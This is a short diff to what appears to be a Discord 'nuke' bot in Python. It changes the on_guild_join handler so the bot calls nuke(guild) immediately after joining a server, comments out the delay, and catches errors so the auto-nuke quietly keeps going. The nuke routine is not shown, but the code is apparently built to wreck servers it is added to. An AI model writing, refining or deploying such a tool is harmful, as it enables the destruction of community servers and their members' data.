@@ -228,9 +228,12 @@ async def on_guild_channel_create(channel):
 
 @bot.event
 async def on_guild_join(guild):
-  if NUKE_ON_JOIN == True:
-    await asyncio.sleep(NUKE_WAIT_TIME)
-    await nuke(guild)
+  if NUKE_ON_JOIN == "True":
+    try:
+      #await asyncio.sleep(NUKE_WAIT_TIME)
+      await nuke(guild)
+    except:
+      print(f"Error while attempting to auto-nuke {guild}")
   else:
     return
 
